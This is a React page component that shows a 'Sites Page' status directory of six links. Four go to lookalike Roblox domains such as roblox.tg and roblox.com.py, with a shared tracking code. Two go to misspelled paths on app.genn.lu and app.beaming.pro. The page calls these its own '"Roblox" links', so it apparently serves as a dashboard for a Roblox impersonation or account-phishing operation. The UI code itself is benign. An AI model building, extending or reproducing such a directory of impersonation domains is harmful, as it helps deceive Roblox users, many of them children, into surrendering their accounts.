import SiteCard from './components/SiteCard';

export default function Home() {
  const sites = [
    {
      title: "roblox.com.gt",
      url: "https://roblox.com.gt/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.tg",
      url: "https://roblox.tg/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.is",
      url: "https://roblox.is/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.py",
      url: "https://roblox.com.py/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "App.genn.lu",
      url: "https://app.genn.lu/auth/mainslte",
      status: "Online",
      flag: "None",
      isMore: true
    },
    {
      title: "App.beaming.pro",
      url: "https://app.beaming.pro/u/SpIank",
      status: "Online",
      flag: "None",
      isMore: true
    }
  ];

  // Разделяем сайты на два ряда по 3
  const firstRow = sites.slice(0, 3);
  const secondRow = sites.slice(3, 6);

  return (
    <div className="min-h-screen p-4 sm:p-6 md:p-8">
      <header className="text-center mb-8 md:mb-12 py-6">
        <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-[#a7a3ff] to-[#5d9bff] bg-clip-text text-transparent">
          Sites Page
        </h1>
        <p className="text-base sm:text-lg md:text-xl opacity-80 max-w-2xl mx-auto">
          Use this page to view all of our &quot;Roblox&quot; links and their current status.
        </p>
      </header>

      {/* Первый ряд из 3 карточек */}
      <div className="flex justify-center mb-8">
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 sm:gap-6 max-w-6xl">
          {firstRow.map((site, index) => (
            <SiteCard 
              key={index}
              site={site}
              index={index}
            />
          ))}
        </div>
      </div>

      {/* Второй ряд из 3 карточек */}
      <div className="flex justify-center">
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 sm:gap-6 max-w-6xl">
          {secondRow.map((site, index) => (
            <SiteCard 
              key={index + 3} // Добавляем смещение для ключей
              site={site}
              index={index + 3}
            />
          ))}
        </div>
      </div>
    </div>
  );
}
